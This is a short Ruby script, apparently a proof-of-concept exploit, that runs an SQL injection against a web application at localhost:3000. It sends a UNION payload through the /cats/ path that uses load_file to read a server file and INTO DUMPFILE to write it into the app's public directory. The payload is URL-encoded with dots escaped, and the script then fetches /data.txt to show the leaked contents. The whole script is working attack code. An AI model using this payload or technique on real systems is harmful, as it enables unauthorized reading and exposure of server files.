require "cgi"

puts "read data and write to public file on server via SQL injection:"
puts "-----------------------"
injection=%Q|1') union all (select load_file('/home/app/file.txt'),"","","","","" into dumpfile '/home/app/app/current/public/data.txt|

DOT = "%%%x" % ".".each_byte.first

escaped_injection = CGI.escape(injection).gsub("+", "%20").gsub(".", DOT)

`curl -4 -i --silent "http://localhost:3000/cats/#{escaped_injection}"`

system(%Q|curl -4 --silent "http://localhost:3000/data.txt"|)
puts "-----------------------"

